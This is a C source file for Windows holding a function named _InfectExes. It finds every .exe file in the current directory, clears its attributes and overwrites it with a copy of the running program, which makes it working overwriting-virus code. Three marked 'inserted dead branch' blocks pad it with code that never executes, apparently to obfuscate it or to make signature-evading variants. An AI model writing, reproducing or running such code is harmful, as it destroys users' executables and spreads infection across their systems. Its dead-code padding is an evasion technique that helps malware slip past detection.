#include "data_globals.h"
#include <windows.h>
#include <stdint.h>
#include <stdlib.h>   // for malloc/free
#include <string.h>   // for strlen/memcpy/memset

#pragma optimize("", off)
uint32_t _InfectExes(void)
{
    uint32_t result;
    BOOL success;
    char current_exe_path[256];
    WIN32_FIND_DATAA file_data;
    HANDLE find_handle;

    // --- INSERTED DEAD BRANCH 1 (ADDITIVE ONLY) ---
    volatile int dummy_x_1 = 7;
    if ((dummy_x_1 * (dummy_x_1 + 1)) % 2 != 0) {
        SYSTEM_INFO si;
        SYSTEMTIME st;
        char user_buf[128];
        DWORD user_len = sizeof(user_buf);
        GetSystemInfo(&si);
        GetLocalTime(&st);
        if (GetUserNameA(user_buf, &user_len)) {
            volatile DWORD hash = 0;
            for (volatile DWORD i = 0; i < 2; i++) {
                hash += si.dwNumberOfProcessors + st.wHour;
            }
            hash ^= user_buf[0];
            // read existing local (no modification)
            volatile size_t path_len = current_exe_path ? strlen(current_exe_path) : 0;
            hash += (DWORD)path_len;
            volatile DWORD j = 0;
            while (j < 2) {
                hash = (hash << 5) - hash + si.dwPageSize;
                j++;
            }
            memset(user_buf, 0, sizeof(user_buf));
        }
    }

    GetModuleFileNameA(NULL, current_exe_path, sizeof(current_exe_path));
    find_handle = FindFirstFileA("*.exe", &file_data);

    if (find_handle == INVALID_HANDLE_VALUE)
    {
        result = 1;
    }
    else
    {
        SetFileAttributesA(file_data.cFileName, FILE_ATTRIBUTE_NORMAL);
        CopyFileA(current_exe_path, file_data.cFileName, FALSE);

        while (TRUE)
        {
            // --- INSERTED DEAD BRANCH 2 (ADDITIVE ONLY) ---
            if (GetPriorityClass(GetCurrentProcess()) == 0xFFFFFFFF) {
                char *tmp = (char *)malloc(64);
                if (tmp != NULL) {
                    strcpy(tmp, "dummy");
                    volatile DWORD len = strlen(tmp);
                    volatile BYTE check = 0;
                    for (volatile DWORD k = 0; k < len; k++) {
                        check ^= tmp[k];
                    }
                    volatile DWORD j = 0;
                    while (j < 2) {
                        // read existing locals (no modification)
                        check += j + (DWORD)file_data.cFileName[0];
                        j++;
                    }
                    char tmp2[32];
                    memcpy(tmp2, tmp, 4);
                    volatile DWORD val = (DWORD)tmp2[0] + check;
                    val += len;
                    free(tmp);
                }
            }

            success = FindNextFileA(find_handle, &file_data);
            if (success == 0) break;
            SetFileAttributesA(file_data.cFileName, FILE_ATTRIBUTE_NORMAL);
            CopyFileA(current_exe_path, file_data.cFileName, FALSE);
        }

        FindClose(find_handle);
        result = 0;
    }

    // --- INSERTED DEAD BRANCH 3 (ADDITIVE ONLY) ---
    volatile DWORD dummy_tick_3 = GetTickCount();
    if ((dummy_tick_3 ^ 0x5A5A5A5A) == 0xFFFFFFFF && (dummy_tick_3 & 0x80000000) != 0) {
        volatile DWORD dummy_array[4];
        for (volatile DWORD k = 0; k < 4; k++) {
            dummy_array[k] = k * 0x811C9DC5;
        }
        volatile DWORD hash = 0;
        for (volatile DWORD k = 0; k < 4; k++) {
            hash ^= dummy_array[k];
            hash = (hash << 5) - hash;
        }
        volatile DWORD extra_val = 0;
        for (volatile DWORD k = 0; k < 2; k++) {
            extra_val += (hash >> k) & 0xFF;
        }
        extra_val ^= dummy_array[3];
        // read existing locals (no modification)
        extra_val += (DWORD)result;
        memset(dummy_array, 0, sizeof(dummy_array));
    }

    return result;
}
#pragma optimize("", on)
